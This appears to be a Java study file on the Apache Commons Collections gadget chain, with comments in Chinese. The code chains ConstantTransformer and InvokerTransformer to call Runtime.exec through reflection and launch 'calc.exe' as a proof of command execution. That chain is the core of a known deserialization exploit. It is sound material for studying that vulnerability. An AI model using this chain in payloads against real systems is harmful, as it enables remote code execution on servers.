package cc.saferoad.apachecc;/*
@auther S0cke3t
@date 2021-01-28
*/

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

public class ChainedTransformerTest {
    public static void main(String[] args) {
        // 定义需要执行的本地系统命令
        String cmd = "calc.exe";

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{
                        String.class, Class[].class}, new Object[]{
                        "getRuntime", new Class[0]}
                ),
                new InvokerTransformer("invoke", new Class[]{
                        Object.class, Object[].class}, new Object[]{
                        null, new Object[0]}
                ),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd})
        };
        // 创建ChainedTransformer调用链对象
        Transformer transformedChain = new ChainedTransformer(transformers);
        Object transform = transformedChain.transform(null);
        System.out.println(transform);
    }
}
